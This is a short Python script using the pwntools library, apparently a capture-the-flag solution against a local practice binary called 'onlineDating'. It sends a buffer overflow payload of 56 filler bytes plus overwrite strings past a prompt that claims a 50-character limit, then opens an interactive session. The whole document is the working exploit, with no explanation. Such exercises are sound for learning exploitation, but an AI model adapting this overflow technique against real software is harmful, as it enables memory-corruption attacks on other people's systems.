from pwn import *

payload = b'A'* 56 + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

r = process('../onlineDating')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()